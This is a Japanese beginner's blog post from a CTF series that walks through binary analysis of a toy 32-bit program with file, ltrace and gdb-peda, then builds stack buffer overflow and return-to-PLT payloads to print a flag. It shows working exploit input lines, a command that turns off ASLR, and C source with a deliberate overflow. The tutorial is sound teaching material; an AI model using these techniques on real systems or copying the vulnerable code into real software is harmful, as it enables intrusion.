+++
title = "Catch the Binary if You Can"
draft = false
date = "2016-12-12T14:34:37+09:00"
thumbnail = "images/geek/ctf.jpg"

tags = ['IT', 'CTF']
+++

# TL;DR

この記事は[eeic Adevent Calendar 2016 その２](http://qiita.com/advent-calendar/2016/eeic2)の１１日目です。


+ 第一部: [CTFについて]({{< ref "post/catch_the_flag_if_you_can.md" >}})
+ 第二部: [はじめてのバイナリ解析]({{< ref "post/catch_the_flag_if_you_can_binary.md" >}})
+ 第三部: [SECCON2016 write up]({{< ref "post/catch_the_flag_if_you_can_seccon.md" >}})

この記事は第二部です。（長くなったので分割しました。）

# はじめてのバイナリ解析 {#binary}

CTFの花形はバイナリ解析です。
[セキュリティコンテストチャレンジブック](https://www.amazon.co.jp/dp/4839956480/ref=sr_1_1?ie=UTF8&qid=1481523754&sr=8-1)で少し勉強したので、バイナリ解析の基礎を紹介したいと思います。

## バイナリとは

バイナリとは一般的に「コンピュータが扱えるように2進数で表されたデータ」です。なので画像ファイルなどもバイナリなのですが、バイナリ解析で扱うバイナリはコンピュータが実行可能なプログラムのファイルのことを指します。

## 表層解析と動的解析と静的解析

例えばCのプログラムをgccでコンパイルした時のa.outをそのまま渡されてなにが「分かることを豊かに述べよk」なんて言われたらどうしますか？

### 表層解析
まじファイルを実行する前に分かることを調べましょう。そのために`file`と`strings`というコマンドを使います。

```
# $ file a.out
a.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=643b4dc3720a4a5eefe53a385df75358698e2d65, not stripped
```

`file`コマンドでどのようなファイルかがわかります。
今回の場合、

+ ELF 32bit - 32bit Linuxの実行ファイル
+ Intel 80386 - intel i386アーキテクチャ
+ dynamically linked - 動的リンクを採用している
+ not stripped - シンボル情報が残っている

ということがわかります。

`strings`コマンドは実行ファイル中に存在する連続したASCII文字列を抜き出してくれます。
リンクするライブラリ名やプログラム中の文字列リテラルなどが分かります。

### 実行する前に

OSにはRELROやカナリアやASLRといった様々なセキュリティ機能があります。  
カナリアはスタック上に値を挿入することでバッファオーバーフローを感知する仕組みです。  
ASRLはスタックやヒープのアドレスの一部をランダム化することで攻撃者がアドレスを推測するのを困難にします。  
問題を簡単にするためにカナリアとASRLは無効化しておきます。

```
sudo sysctl -w kernel.randomize_va_space=0
```

カナリアを無効にするにはコンパイル時に`-fno-stack-protector`をつけます。


### 動的解析


実行可能な環境が分かったところで実際に動かいして見ましょう

```
# $ ./a.out
buffer: 0x56557020

```

bufferのアドレスが出力されて、入力待ちになりました。適当な文字列を打つとそのまま終了します。

Linuxにはトレーサーというものがあり、実行ファイルがどのようなリソースを使っているのか調べることが出来ます。

+ strace - システムコールを監視する。
+ ltrace - 共有ライブラリの呼び出しを監視する。

ltraceをしてみましょう。

```
# $ ltrace ./a.out
__libc_start_main(0x565a3626, 1, 0xff89bec4, 0x565a3680 <unfinished ...>
printf("buffer: 0x%x\n", 0x565a5024buffer: 0x565a5024
)                           = 19
fgets(hoge
"hoge\n", 128, 0xf77925a0)                               = 0xff89bdf6
+++ exited (status 0) +++
```

"buffer: 0x..."を出力するにprintfを、入力にはfgetsを使っていることが分かりました。

分かる情報は少ないですが、straceやltraceや実際に実行することでプログラムの大まかな流れを把握することが出来ます。

より詳細に見るために、gdbなどのデバッガで見ていきます。
gdbでのバイナリ解析をより便利にするために[gdb-peda](https://github.com/longld/peda)というを入れています。
gdbで逐次実行してもいいのですが、これみよがしににbufferのアドレスが出力されているので、それを見てみましょう。

```
# $ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x635
gdb-peda$ r
Starting program: /home/vagrant/projects/ctf/challenge_book/test/a.out
 [----------------------------------registers-----------------------------------]
EAX: 0xf7faedbc --> 0xffffc62c --> 0xffffc826 ("USER=vagrant")
EBX: 0x0
ECX: 0xffffc590 --> 0x1
EDX: 0xffffc5b4 --> 0x0
ESI: 0x1
EDI: 0xf7fad000 --> 0x1b2db0
EBP: 0xffffc578 --> 0x0
ESP: 0xffffc570 --> 0xffffc590 --> 0x1
EIP: 0x56555635 (<main+15>:     call   0x5655566e <__x86.get_pc_thunk.ax>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555631 <main+11>:        mov    ebp,esp
   0x56555633 <main+13>:        push   ebx
   0x56555634 <main+14>:        push   ecx
=> 0x56555635 <main+15>:        call   0x5655566e <__x86.get_pc_thunk.ax>
   0x5655563a <main+20>:        add    eax,0x19c6
   0x5655563f <main+25>:        sub    esp,0x8
   0x56555642 <main+28>:        lea    edx,[eax+0x20]
   0x56555648 <main+34>:        push   edx
Guessed arguments:
arg[0]: 0xffffc590 --> 0x1
arg[1]: 0x0
arg[2]: 0x0
arg[3]: 0xf7e12276 (<__libc_start_main+246>:    add    esp,0x10)
[------------------------------------stack-------------------------------------]
0000| 0xffffc570 --> 0xffffc590 --> 0x1
0004| 0xffffc574 --> 0x0
0008| 0xffffc578 --> 0x0
0012| 0xffffc57c --> 0xf7e12276 (<__libc_start_main+246>:       add    esp,0x10)
0016| 0xffffc580 --> 0x1
0020| 0xffffc584 --> 0xf7fad000 --> 0x1b2db0
0024| 0xffffc588 --> 0x0
0028| 0xffffc58c --> 0xf7e12276 (<__libc_start_main+246>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555635 in main ()
gdb-peda$ x/1bs  0x56557020
0x56557020 <buffer>:    "flag:first_pwn"
```

flagが見つかりましたね！


さてこれだけだと簡単すぎるので、もう少し難しくしましょう。

実はこの実行ファイルはサンプルで、本物の実行ファイルがサーバーにあって、telnet経由で標準入力のやりとりだけできるとします。
標準入力だけでflagを表示させないといけないわけです。

幸い、flagがbufferにあることが分かっています。さらに入力にfgetsを使っていますが、fgetsはバッファオーバーフロー脆弱性があることが分かっています。

バッファオーバーフロー脆弱性をつくためにもう少し詳しく調べてみましょう。

### バッファオーバーフロー

バッファオーバーフローとは一般的にプログラムが決められたメモリ以外を塗りつぶししてしまい、セグメンテーション違反などが起きることです。

実際に試して見ましょう。

```
# $ ./a.out
buffer: 0x56557020
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./a.out
```

セグフォってますね。セグフォはgdbで調べることが出来ます。

```
# $ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/vagrant/projects/ctf/challenge_book/test/a.out
buffer: 0x56557020
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
 [----------------------------------registers-----------------------------------]
EAX: 0xffffc556 ('A' <repeats 68 times>, "\n")
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fae87c --> 0x0
EDX: 0xffffc556 ('A' <repeats 68 times>, "\n")
ESI: 0x1
EDI: 0xf7fad000 --> 0x1b2db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffc570 ('A' <repeats 42 times>, "\n")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffc570 ('A' <repeats 42 times>, "\n")
0004| 0xffffc574 ('A' <repeats 38 times>, "\n")
0008| 0xffffc578 ('A' <repeats 34 times>, "\n")
0012| 0xffffc57c ('A' <repeats 30 times>, "\n")
0016| 0xffffc580 ('A' <repeats 26 times>, "\n")
0020| 0xffffc584 ('A' <repeats 22 times>, "\n")
0024| 0xffffc588 ('A' <repeats 18 times>, "\n")
0028| 0xffffc58c ('A' <repeats 14 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

レジスタをみてみるとEIPがAAAAで塗りつぶされています。このEIPというレジスタは次に実行するアセンブリ命令のアドレス(PC)を指しています。これが0x41414141("AAAA")となっているので`Invalid $PC`となってしまいセグフォてます。  
EIPの書き換えが可能というのとても重大な脆弱性でこれをつくことでプログラムを好きな実行命令を実行させることが出来たりします。（詳しく知りたい人はret2libcで調べましょう。）

### 静的解析

静的解析とはプログラムの実行ファイルを逆アセンブルして読んでいくことです。この手法は時間がかかりますが、一応プログラムの全てを把握することが出来ます。

ただそのためにはアセンプリを読める必要があります。  
まあみなさんeeicの人読めるとは思いますが。

冗談です。普通は読めません。

詳しく説明するると長くなる上自分もほとんど詳しくないので、（ボロが出ないよう）必要な時にちょこちょこ説明をはさむようにします。

とりあえず逆アセンブルしてみましょう。

```
# $ objdump -d -M intel --no a.out > asm.s
```

main関数のところをみるとこんな感じになっています。

```
00000626 <main>:
 626: lea    ecx,[esp+0x4]
 62a: and    esp,0xfffffff0
 62d: push   DWORD PTR [ecx-0x4]
 630: push   ebp
 631: mov    ebp,esp
 633: push   ebx
 634: push   ecx
 635: call   66e <__x86.get_pc_thunk.ax>
 63a: add    eax,0x19c6
 63f: sub    esp,0x8
 642: lea    edx,[eax+0x20]
 648: push   edx
 649: lea    edx,[eax-0x1900]
 64f: push   edx
 650: mov    ebx,eax
 652: call   440 <printf@plt>
 657: add    esp,0x10
 65a: call   5f0 <input>
 65f: mov    eax,0x0
 664: lea    esp,[ebp-0x8]
 667: pop    ecx
 668: pop    ebx
 669: pop    ebp
 66a: lea    esp,[ecx-0x4]
 66d: ret
```

main関数では0x00000652でprintfを、0x0000065aでinputという関数を呼び出していることが分かります。

とりあえずmain関数のアドレスがわかったので、EIPをmain関数に設定してみましょう。

まずEIPが入力のどの部分で上書きされるか調べます。
gdb-pedaにはpattcとpattoという便利なコマンドがあります。

```
# $ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ pattc 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/vagrant/projects/ctf/challenge_book/test/a.out
buffer: 0x56557020
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
 [----------------------------------registers-----------------------------------]
EAX: 0xffffc556 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n")
EBX: 0x41416e41 ('AnAA')
ECX: 0xf7fae87c --> 0x0
EDX: 0xffffc556 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n")
ESI: 0x1
EDI: 0xf7fad000 --> 0x1b2db0
EBP: 0x2d414143 ('CAA-')
ESP: 0xffffc570 ("ADAA;AA)AAEAAaAA0AAFAAbA\n")
EIP: 0x41284141 ('AA(A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41284141
[------------------------------------stack-------------------------------------]
0000| 0xffffc570 ("ADAA;AA)AAEAAaAA0AAFAAbA\n")
0004| 0xffffc574 (";AA)AAEAAaAA0AAFAAbA\n")
0008| 0xffffc578 ("AAEAAaAA0AAFAAbA\n")
0012| 0xffffc57c ("AaAA0AAFAAbA\n")
0016| 0xffffc580 ("0AAFAAbA\n")
0020| 0xffffc584 ("AAbA\n")
0024| 0xffffc588 --> 0xa ('\n')
0028| 0xffffc58c --> 0xf7e12276 (<__libc_start_main+246>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41284141 in ?? ()
gdb-peda$ patto AA(A
AA(A found at offset: 22
```

pattcで生成した文字列を入力して、EIPに入力された文字列が何バイト目に現れるかpattoで調べます。
今回の場合22とわかりました。  
なのでfgetsのリターンアドレスをmain関数(0x56555626)の先頭にするには以下のような入力になります。
intelアーキテクチャはリトルエンディアンであること、objdumpで分かったアドレスにオフセットを加えることに注意してください。  
bufferのアドレスが2回出てきたら成功です。

```
# $ echo -e 'AAAAAAAAAAAAAAAAAAAAAA\x26\x56\x55\x56' | ./a.out
buffer: 0x56557020
buffer: 0x56557020
zsh: done                echo -e 'AAAAAAAAAAAAAAAAAAAAAA\x26\x56\x55\x56' |
zsh: segmentation fault  ./a.out
```

### Return to PLT

call命令はjump命令と同じく次の命令を指定されたアドレスに飛ばします。この時ret命令で戻ってこれるようにリターンアドレスをスタックにpushする点が違います。
この時ret命令ではスタックの一番先をeipにpopします。前の攻撃でmain関数が2回実行されたのは、バッファオーバーフローでリターンアドレスが上書きされてしまい、それがret命令でeipにセットされたからでした。

flagを得るにはbufferを出力したいわけです。そこでmain関数を呼び出すのではなく、printf関数をbufferを引数に呼び出してみましょう。

アセンブリでの引数はスタック上にあります。
例えば2個引数をとる関数を呼び出すにはcallをする前に必要な引数をスタック上にpushしておきます。
なのでバッファオーバーフローでリターンアドレスだけではなく、引数の部分も上書きしてしまえば、あたかもその引数で本当にその関数を呼び出したかのように実行できます。

オーバーフロー後のスタックは以下の表にのなります。


address| value
---|---
0x00000000|
...|
リターンアドレス| printfのアドレス
printf呼び出し後のアドレス|ダミー
引数1|bufferのアドレス
...|
0xFFFFFFFF|

bufferのアドレスは実行した時に分かっていますが、readelfを使って知ることも出来ます。

```
# $ readelf -s a.out| grep buffer
    58: 00002020    15 OBJECT  GLOBAL DEFAULT   25 buffer
```

なので、bufferのアドレスは0x56557020となります。

次にprintfのアドレスを調べましょう。

printfは共有ライブラリの関数なので実行ファイルには含まれず動的リンクされます。動的リンクされた関数を呼び出すためにPLTと呼ばれるコード片が実行ファイルには含まれます。

```
# $ objdump -d -M intel -j .plt --no a.out

a.out:     ファイル形式 elf32-i386


セクション .plt の逆アセンブル:

00000430 <printf@plt-0x10>:
 430:   push   DWORD PTR [ebx+0x4]
 436:   jmp    DWORD PTR [ebx+0x8]
 43c:   add    BYTE PTR [eax],al
        ...

00000440 <printf@plt>:
 440:   jmp    DWORD PTR [ebx+0xc]
 446:   push   0x0
 44b:   jmp    430 <_init+0x30>

00000450 <fgets@plt>:
 450:   jmp    DWORD PTR [ebx+0x10]
 456:   push   0x8
 45b:   jmp    430 <_init+0x30>

00000460 <__libc_start_main@plt>:
 460:   jmp    DWORD PTR [ebx+0x14]
 466:   push   0x10
 46b:   jmp    430 <_init+0x30>
```

printfのアドレスは0x56555430になります。

ここでprintf@pltをみるとjump先のアドレスを$EBXレジスタから計算しています。（`DWORD PTR [ebx+0x8]`の部分）

なので、$EBXレジスタも正しい値にしないといけません。
gdbでprintfを呼び出した時の$EBXの値を見ると、0x56557000でした。
また上書きした時のoffsetを14でした。なので入力は下記のようになります。

```
# $ echo -en 'AAAAAAAAAAAAAA\x00\x70\x55\x56SAAA\x40\x54\x55\x56BBBB\x20\x70\x55\x56' | ./a.out
```

これでうまくいくprintfが実行されるはずですが、実際にやってみると表示されません。
どうやらどっかでバッファしているらしく、printfのret時にはセグフォが起きると表示されないようです。
なのでprintfのリターンアドレスをmain関数の先頭にして起きます。

最終的な攻撃パターンは以下のようになります。


```
# $ echo -e 'AAAAAAAAAAAAAA\x00\x70\x55\x56AAAA\x40\x54\x55\x56\x26\x56\x55\x56\x20\x70\x55\x56' | ./a.out
buffer: 0x56557020
flag:first_pwnbuffer: 0x56557020
zsh: done                echo -en  |
zsh: segmentation fault  ./a.out
```

表示されましたね！

実行ファイルの元のプログラムを貼っておきます。

```c
#include <stdio.h>
#include <string.h>

char buffer[] = "flag:first_pwn";

void input() {
  char local[10];
  fgets(local, 128, stdin);
}

int main() {
  printf("buffer: 0x%x\n", buffer);
  input();

  return 0;
}
```

# 最後に

簡単な例題のはずがえらい時間がかかりました。pwnは慣れが必要なので数をこなす必要があるんでしょうね。

あと今回はechoでエクスプロイトコードを履いていますがいちいちこれを書くのは面倒でしょう。
pwntoolというpythonのライブラリを使うと結構簡単になります。

